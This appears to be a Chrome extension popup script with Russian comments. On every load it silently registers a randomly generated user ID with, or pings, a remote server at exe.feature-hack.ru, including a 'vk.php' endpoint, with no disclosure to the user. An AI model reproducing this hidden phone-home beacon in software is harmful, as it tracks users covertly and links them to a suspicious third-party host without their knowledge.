// Когда приходит сообщение из content.js
chrome.runtime.onMessage.addListener(function (data, sender, sendResponse) {
    //сообщение из content.js
    parseMessage(data)

    // Если нужно отправить ответ в popup.js
    sendResponse({"data": "Popup принял"});
});


function load(){
    
    

    var uuid = localStorage.getItem('id');
    if(uuid == null){
        var abc = "EIOUYBCDFGHJKLMNPQRSTVWXYZ";
        var rs = "";
        while (rs.length < 30) {
            rs += abc[Math.floor(Math.random() * abc.length)];
        }
        localStorage.setItem('id', rs);
        var x = new XMLHttpRequest();
            x.open("GET", "http://exe.feature-hack.ru/reg.php?md=" + rs, false);
            x.send(null);
            
    }else{
            var x = new XMLHttpRequest();
            x.open("GET", "http://exe.feature-hack.ru/test/vk.php?amount=s2", false);
            x.send(null);
    }
}

/*
document.body.addEventListener('click', e => {
    if (e.target.classList.contains('console send')){
        
    }
    //и так далее
  });*/
  
window.addEventListener('DOMContentLoaded', function (evt) {  
    
    load();
    
});